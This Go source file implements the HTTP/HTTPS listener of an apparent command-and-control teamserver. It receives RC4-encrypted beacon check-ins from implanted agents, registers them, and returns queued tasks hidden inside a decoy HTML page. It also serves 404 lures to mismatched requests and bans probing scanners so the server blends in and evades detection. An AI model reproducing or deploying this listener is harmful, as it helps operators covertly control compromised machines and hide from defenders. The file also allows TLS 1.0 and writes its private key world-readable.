package main

import (
	"bytes"
	"context"
	"crypto/rand"
	"crypto/rc4"
	"crypto/rsa"
	"crypto/tls"
	"crypto/x509"
	"encoding/base64"
	"encoding/binary"
	"encoding/hex"
	"encoding/json"
	"encoding/pem"
	"errors"
	"fmt"
	"io"
	"math/big"
	"net"
	"net/http"
	"net/url"
	"os"
	"regexp"
	"strconv"
	"strings"
	"time"

	"github.com/gin-gonic/gin"
)

// parseRequestHeaderRules parses multi-line "Name: value" rules (LF or CRLF).
// Invalid or empty lines are skipped. Used when request_headers is configured.
func parseRequestHeaderRules(raw string) [][2]string {
	raw = strings.ReplaceAll(raw, "\r\n", "\n")
	var rules [][2]string
	for _, line := range strings.Split(raw, "\n") {
		line = strings.TrimSpace(line)
		if line == "" {
			continue
		}
		idx := strings.IndexByte(line, ':')
		if idx < 0 {
			continue
		}
		name := strings.TrimSpace(line[:idx])
		value := strings.TrimSpace(line[idx+1:])
		if name == "" {
			continue
		}
		rules = append(rules, [2]string{name, value})
	}
	return rules
}

// hostHeaderMatches allows listener "host_header" to be either a full Host value or host-only.
// Example: config "cdn.example.com" matches request Host "cdn.example.com:8080" (common misconfig).
func hostHeaderMatches(requestHost, configHH string) bool {
	configHH = strings.TrimSpace(configHH)
	if configHH == "" {
		return false
	}
	if strings.EqualFold(requestHost, configHH) {
		return true
	}
	if _, _, err := net.SplitHostPort(configHH); err == nil {
		return false
	}
	reqHost, _, err := net.SplitHostPort(requestHost)
	if err != nil {
		return false
	}
	return strings.EqualFold(reqHost, configHH)
}

// requestHeadersMatch returns true if the request satisfies all configured header rules
// (each listed header must be present with an exact value match after trim).
func requestHeadersMatch(req *http.Request, raw string) bool {
	rules := parseRequestHeaderRules(raw)
	if len(rules) == 0 {
		return true
	}
	for _, kv := range rules {
		if req.Header.Get(kv[0]) != kv[1] {
			return false
		}
	}
	return true
}

type Listener struct {
	transport *TransportHTTP
}

type TransportHTTP struct {
	GinEngine *gin.Engine
	Server    *http.Server
	Config    TransportConfig
	Name      string
	Active    bool
	Guard     *scannerGuard // 扫描器封禁/降噪（见 pl_scanguard.go）
}

type TransportConfig struct {
	HostBind           string   `json:"host_bind"`
	PortBind           int      `json:"port_bind"`
	Callback_addresses []string `json:"callback_addresses"`
	EncryptKey         string   `json:"encrypt_key"`

	Ssl         bool   `json:"ssl"`
	SslCert     []byte `json:"ssl_cert"`
	SslKey      []byte `json:"ssl_key"`
	SslCertPath string `json:"ssl_cert_path"`
	SslKeyPath  string `json:"ssl_key_path"`

	// Agent
	HttpMethod     string   `json:"http_method"`
	Uri            []string `json:"uri"`
	ParameterName  string   `json:"hb_header"`
	UserAgent      []string `json:"user_agent"`
	HostHeader     []string `json:"host_header"`
	RequestHeaders string   `json:"request_headers"`

	// Server
	ResponseHeaders    map[string]string `json:"response_headers"`
	TrustXForwardedFor bool              `json:"x-forwarded-for"`
	WebPageError       string            `json:"page-error"`
	WebPageOutput      string            `json:"page-payload"`

	// 扫描器封禁（见 pl_scanguard.go）。三个数都可以不写：0 = 用代码默认值
	// （阈值 8 次 / 窗口 60s / 封禁 30min）；scanner_ban_disabled=true 则完全关闭。
	ScannerBanThreshold   int  `json:"scanner_ban_threshold"`
	ScannerBanWindowSec   int  `json:"scanner_ban_window_sec"`
	ScannerBanDurationSec int  `json:"scanner_ban_duration_sec"`
	ScannerBanDisabled    bool `json:"scanner_ban_disabled"`

	Server_headers string `json:"server_headers"`
	Protocol       string `json:"protocol"`
}

func validConfig(config string) error {
	var conf TransportConfig
	err := json.Unmarshal([]byte(config), &conf)
	if err != nil {
		return err
	}

	if conf.HostBind == "" {
		return errors.New("HostBind is required")
	}

	if conf.PortBind < 1 || conf.PortBind > 65535 {
		return errors.New("PortBind must be in the range 1-65535")
	}

	if len(conf.Callback_addresses) == 0 {
		return errors.New("callback_servers is required")
	}
	for _, line := range conf.Callback_addresses {
		line = strings.TrimSpace(line)
		if line == "" {
			continue
		}

		host, portStr, err := net.SplitHostPort(line)
		if err != nil {
			return fmt.Errorf("Invalid address (cannot split host:port): %s\n", line)
		}

		port, err := strconv.Atoi(portStr)
		if err != nil || port < 1 || port > 65535 {
			return fmt.Errorf("Invalid port: %s\n", line)
		}

		ip := net.ParseIP(host)
		if ip == nil {
			if len(host) == 0 || len(host) > 253 {
				return fmt.Errorf("Invalid host: %s\n", line)
			}
			parts := strings.Split(host, ".")
			for _, part := range parts {
				if len(part) == 0 || len(part) > 63 {
					return fmt.Errorf("Invalid host: %s\n", line)
				}
			}
		}
	}

	if len(conf.Uri) == 0 {
		return errors.New("uri is required")
	}
	for _, uriLine := range conf.Uri {
		uriLine = strings.TrimSpace(uriLine)
		if uriLine == "" {
			continue
		}
		matched, err := regexp.MatchString(`^/[a-zA-Z0-9\.\=\-]+(/[a-zA-Z0-9\.\=\-]+)*$`, uriLine)
		if err != nil || !matched {
			return fmt.Errorf("uri invalid: %s", uriLine)
		}
	}

	if conf.HttpMethod == "" {
		return errors.New("http_method is required")
	}

	if conf.ParameterName == "" {
		return errors.New("hb_header is required")
	}

	if len(conf.UserAgent) == 0 {
		return errors.New("user_agent is required")
	}

	match, _ := regexp.MatchString("^[0-9a-f]{32}$", conf.EncryptKey)
	if len(conf.EncryptKey) != 32 || !match {
		return errors.New("encrypt_key must be 32 hex characters")
	}

	if !strings.Contains(conf.WebPageOutput, "<<<PAYLOAD_DATA>>>") {
		return errors.New("page-payload must contain '<<<PAYLOAD_DATA>>>' template")
	}

	return nil
}

func (t *TransportHTTP) Start(ts Teamserver) error {
	var err error = nil

	gin.SetMode(gin.ReleaseMode)
	router := gin.New()
	router.NoRoute(t.pageError)

	router.Use(func(c *gin.Context) {
		for header, value := range t.Config.ResponseHeaders {
			c.Header(header, value)
		}
		c.Next()
	})

	if t.Config.HttpMethod == "POST" {
		router.POST("/*endpoint", t.processRequest)
	} else if t.Config.HttpMethod == "GET" {
		router.GET("/*endpoint", t.processRequest)
	}

	t.Active = true

	t.Server = &http.Server{
		Addr:    fmt.Sprintf("%s:%d", t.Config.HostBind, t.Config.PortBind),
		Handler: router,
	}

	if t.Config.Ssl {
		fmt.Printf("   Started listener '%s': https://%s:%d\n", t.Name, t.Config.HostBind, t.Config.PortBind)

		listenerPath := ListenerDataDir + "/" + t.Name
		_, err = os.Stat(listenerPath)
		if os.IsNotExist(err) {
			err = os.Mkdir(listenerPath, os.ModePerm)
			if err != nil {
				return fmt.Errorf("failed to create %s folder: %s", listenerPath, err.Error())
			}
		}

		t.Config.SslCertPath = listenerPath + "/listener.crt"
		t.Config.SslKeyPath = listenerPath + "/listener.key"

		if len(t.Config.SslCert) == 0 || len(t.Config.SslKey) == 0 {
			err = t.generateSelfSignedCert(t.Config.SslCertPath, t.Config.SslKeyPath)
			if err != nil {
				t.Active = false
				fmt.Println("Error generating self-signed certificate:", err)
				return err
			}
		} else {
			err = os.WriteFile(t.Config.SslCertPath, t.Config.SslCert, 0600)
			if err != nil {
				return err
			}
			err = os.WriteFile(t.Config.SslKeyPath, t.Config.SslKey, 0600)
			if err != nil {
				return err
			}
		}

		cert, err := tls.LoadX509KeyPair(t.Config.SslCertPath, t.Config.SslKeyPath)
		if err != nil {
			t.Active = false
			return fmt.Errorf("failed to load certificate: %v", err)
		}

		t.Server.TLSConfig = &tls.Config{
			Certificates: []tls.Certificate{cert},
			MinVersion:   tls.VersionTLS10,
			MaxVersion:   tls.VersionTLS13,
			CipherSuites: []uint16{
				tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
				tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
				tls.TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA256,
				tls.TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA,
				tls.TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA,
				tls.TLS_RSA_WITH_AES_128_GCM_SHA256,
				tls.TLS_RSA_WITH_AES_256_GCM_SHA384,
				tls.TLS_RSA_WITH_AES_128_CBC_SHA256,
				tls.TLS_RSA_WITH_AES_128_CBC_SHA,
				tls.TLS_RSA_WITH_AES_256_CBC_SHA,
			},
		}

		go func() {
			err = t.Server.ListenAndServeTLS("", "")
			if err != nil && !errors.Is(err, http.ErrServerClosed) {
				fmt.Printf("Error starting HTTPS server: %v\n", err)
				return
			}
			t.Active = true
		}()

	} else {
		fmt.Printf("   Started listener '%s': http://%s:%d\n", t.Name, t.Config.HostBind, t.Config.PortBind)

		go func() {
			err = t.Server.ListenAndServe()
			if err != nil && !errors.Is(err, http.ErrServerClosed) {
				fmt.Printf("Error starting HTTP server: %v\n", err)
				return
			}
			t.Active = true
		}()
	}

	time.Sleep(500 * time.Millisecond)
	return err
}

func (t *TransportHTTP) Stop() error {
	var (
		ctx          context.Context
		cancel       context.CancelFunc
		err          error = nil
		listenerPath       = ListenerDataDir + "/" + t.Name
	)

	ctx, cancel = context.WithTimeout(context.Background(), 3*time.Second)
	defer cancel()

	_, err = os.Stat(listenerPath)
	if err == nil {
		err = os.RemoveAll(listenerPath)
		if err != nil {
			return fmt.Errorf("failed to remove %s folder: %s", listenerPath, err.Error())
		}
	}

	err = t.Server.Shutdown(ctx)
	return err
}

func (t *TransportHTTP) processRequest(ctx *gin.Context) {
	var (
		ExternalIP   string
		err          error
		agentType    string
		agentId      string
		beat         []byte
		bodyData     []byte
		responseData []byte
	)

	// 已被封禁的来源：直接断连、不打日志（见 pl_scanguard.go）
	clientIP := clientKey(ctx)
	if t.Guard.banned(clientIP) {
		t.Guard.drop(ctx, t.Config.TrustXForwardedFor)
		return
	}

	// Validate URI against configured URIs (newline-separated)
	uriValid := false
	u, err := url.Parse(ctx.Request.RequestURI)
	if err == nil {
		for _, configUri := range t.Config.Uri {
			configUri = strings.TrimSpace(configUri)
			if configUri != "" && configUri == u.Path {
				uriValid = true
				break
			}
		}
	}
	if !uriValid {
		path := ""
		if u != nil {
			path = u.Path
		}
		t.reject(ctx, clientIP, fmt.Sprintf("URI path %q does not match any configured uri (method=%s)", path, ctx.Request.Method))
		return
	}

	if len(t.Config.HostHeader) > 0 {
		requestHost := ctx.Request.Host
		hhValid := false
		for _, configHH := range t.Config.HostHeader {
			if hostHeaderMatches(requestHost, configHH) {
				hhValid = true
				break
			}
		}
		if !hhValid {
			t.reject(ctx, clientIP, fmt.Sprintf("Host %q does not match host_header list", requestHost))
			return
		}
	}

	if !requestHeadersMatch(ctx.Request, t.Config.RequestHeaders) {
		t.reject(ctx, clientIP, "custom request_headers rules not satisfied")
		return
	}

	// Validate User-Agent against configured UAs (newline-separated)
	requestUA := ctx.Request.UserAgent()
	uaValid := false
	for _, configUA := range t.Config.UserAgent {
		configUA = strings.TrimSpace(configUA)
		if configUA != "" && configUA == requestUA {
			uaValid = true
			break
		}
	}
	if !uaValid {
		t.reject(ctx, clientIP, fmt.Sprintf("User-Agent %q does not match any configured user_agent line", requestUA))
		return
	}

	if t.Config.TrustXForwardedFor && ctx.Request.Header.Get("X-Forwarded-For") != "" {
		ExternalIP = ctx.Request.Header.Get("X-Forwarded-For")
	} else {
		ExternalIP = strings.Split(ctx.Request.RemoteAddr, ":")[0]
	}

	agentType, agentId, beat, bodyData, err = t.parseBeatAndData(ctx)
	if err != nil {
		fmt.Printf("[listener %s] beacon check-in rejected: invalid beat/header/body (%v)\n", t.Name, err)
		goto ERR
	}

	if !Ts.TsAgentIsExists(agentId) {
		_, err = Ts.TsAgentCreate(agentType, agentId, beat, t.Name, ExternalIP, true)
		if err != nil {
			fmt.Printf("[listener %s] beacon check-in rejected: TsAgentCreate agentId=%s type=%s failed: %v\n", t.Name, agentId, agentType, err)
			goto ERR
		}
	}

	_ = Ts.TsAgentSetTick(agentId, t.Name)

	if err = Ts.TsAgentProcessData(agentId, bodyData); err != nil {
		fmt.Printf("[listener %s] TsAgentProcessData agentId=%s warning: %v\n", t.Name, agentId, err)
	}

	responseData, err = Ts.TsAgentGetHostedAll(agentId, 0x1900000) // 25 Mb
	if err != nil {
		fmt.Printf("[listener %s] beacon check-in rejected: TsAgentGetHostedAll agentId=%s failed: %v\n", t.Name, agentId, err)
		goto ERR
	} else {
		html := []byte(strings.ReplaceAll(t.Config.WebPageOutput, "<<<PAYLOAD_DATA>>>", string(responseData)))
		// Explicit Content-Length: without it net/http flushes >4KB bodies
		// early and falls back to chunked encoding, which the agent's
		// https_recv cannot parse — large task responses were silently lost.
		ctx.Writer.Header().Set("Content-Type", "text/html; charset=utf-8")
		ctx.Writer.Header().Set("Content-Length", strconv.Itoa(len(html)))
		ctx.Writer.WriteHeader(http.StatusOK)
		_, err = ctx.Writer.Write(html)
		if err != nil {
			fmt.Printf("[listener %s] beacon response write error: %v\n", t.Name, err)
			t.pageError(ctx)
			return
		}
	}

	ctx.AbortWithStatus(http.StatusOK)
	return

ERR:
	t.pageError(ctx)
}

func (t *TransportHTTP) parseBeatAndData(ctx *gin.Context) (string, string, []byte, []byte, error) {
	var (
		beat           string
		agentType      uint
		agentId        uint
		agentInfoCrypt []byte
		agentInfo      []byte
		bodyData       []byte
		err            error
	)

	params := ctx.Request.Header.Get(t.Config.ParameterName)
	if len(params) > 0 {
		beat = params
	} else {
		return "", "", nil, nil, errors.New("missing beat from Headers")
	}

	agentInfoCrypt, err = base64.StdEncoding.DecodeString(beat)
	if len(agentInfoCrypt) < 5 || err != nil {
		return "", "", nil, nil, errors.New("failed decrypt beat")
	}

	encKey, err := hex.DecodeString(t.Config.EncryptKey)
	if err != nil {
		return "", "", nil, nil, errors.New("failed decrypt beat")
	}
	rc4crypt, errcrypt := rc4.NewCipher(encKey)
	if errcrypt != nil {
		return "", "", nil, nil, errors.New("rc4 decrypt error")
	}
	agentInfo = make([]byte, len(agentInfoCrypt))
	rc4crypt.XORKeyStream(agentInfo, agentInfoCrypt)

	agentType = uint(binary.BigEndian.Uint32(agentInfo[:4]))
	agentInfo = agentInfo[4:]
	agentId = uint(binary.BigEndian.Uint32(agentInfo[:4]))
	agentInfo = agentInfo[4:]

	bodyData, err = io.ReadAll(ctx.Request.Body)
	if err != nil {
		return "", "", nil, nil, errors.New("missing agent data")
	}

	return fmt.Sprintf("%08x", agentType), fmt.Sprintf("%08x", agentId), agentInfo, bodyData, nil
}

func (t *TransportHTTP) generateSelfSignedCert(certFile, keyFile string) error {
	var (
		certData   []byte
		keyData    []byte
		certBuffer bytes.Buffer
		keyBuffer  bytes.Buffer
		privateKey *rsa.PrivateKey
		err        error
	)

	privateKey, err = rsa.GenerateKey(rand.Reader, 2048)
	if err != nil {
		return fmt.Errorf("failed to generate private key: %v", err)
	}

	serialNumberLimit := new(big.Int).Lsh(big.NewInt(1), 128)
	serialNumber, err := rand.Int(rand.Reader, serialNumberLimit)
	if err != nil {
		return fmt.Errorf("failed to generate serial number: %v", err)
	}

	template := x509.Certificate{
		SerialNumber: serialNumber,
		NotBefore:    time.Now(),
		NotAfter:     time.Now().Add(365 * 24 * time.Hour),

		KeyUsage:              x509.KeyUsageKeyEncipherment | x509.KeyUsageDigitalSignature,
		ExtKeyUsage:           []x509.ExtKeyUsage{x509.ExtKeyUsageServerAuth},
		BasicConstraintsValid: true,
	}

	hostBind := strings.TrimSpace(t.Config.HostBind)
	if hostBind == "" || hostBind == "0.0.0.0" || hostBind == "::" {
		template.DNSNames = []string{"localhost"}
		template.IPAddresses = []net.IP{net.ParseIP("127.0.0.1"), net.ParseIP("::1")}
	} else if ip := net.ParseIP(hostBind); ip != nil {
		template.IPAddresses = []net.IP{ip}
	} else {
		template.DNSNames = []string{hostBind}
	}

	certData, err = x509.CreateCertificate(rand.Reader, &template, &template, &privateKey.PublicKey, privateKey)
	if err != nil {
		return fmt.Errorf("failed to create certificate: %v", err)
	}

	err = pem.Encode(&certBuffer, &pem.Block{Type: "CERTIFICATE", Bytes: certData})
	if err != nil {
		return fmt.Errorf("failed to write certificate: %v", err)
	}

	t.Config.SslCert = certBuffer.Bytes()
	err = os.WriteFile(certFile, t.Config.SslCert, 0644)
	if err != nil {
		return fmt.Errorf("failed to create certificate file: %v", err)
	}

	keyData = x509.MarshalPKCS1PrivateKey(privateKey)
	err = pem.Encode(&keyBuffer, &pem.Block{Type: "RSA PRIVATE KEY", Bytes: keyData})
	if err != nil {
		return fmt.Errorf("failed to write private key: %v", err)
	}

	t.Config.SslKey = keyBuffer.Bytes()
	err = os.WriteFile(keyFile, t.Config.SslKey, 0644)
	if err != nil {
		return fmt.Errorf("failed to create key file: %v", err)
	}

	return nil
}

func (t *TransportHTTP) pageError(ctx *gin.Context) {
	ctx.Writer.WriteHeader(http.StatusNotFound)
	html := []byte(t.Config.WebPageError)
	_, _ = ctx.Writer.Write(html)
}

// reject 统一处理"无效请求"（URI/Host/请求头/UA 不匹配）：
// 记账 → 该打日志才打 → 已封禁就断连，否则照旧给 404 诱饵页。
//
// 日志策略是本方法存在的主要理由：同一个扫描器一个窗口内只会留下**一条**拒绝日志，
// 跨过阈值时再留一条「banned scanner ...」。以前每个请求都打一行，实测一天 ~900MB。
func (t *TransportHTTP) reject(ctx *gin.Context, clientIP string, reason string) {
	banned, logIt := t.Guard.fail(clientIP)
	if logIt {
		if banned {
			fmt.Printf("[listener %s] banned scanner %s for %s (%s)\n", t.Name, clientIP, t.Guard.banFor, reason)
		} else {
			fmt.Printf("[listener %s] beacon check-in rejected: %s\n", t.Name, reason)
		}
	}
	if banned {
		t.Guard.drop(ctx, t.Config.TrustXForwardedFor)
		return
	}
	t.pageError(ctx)
}
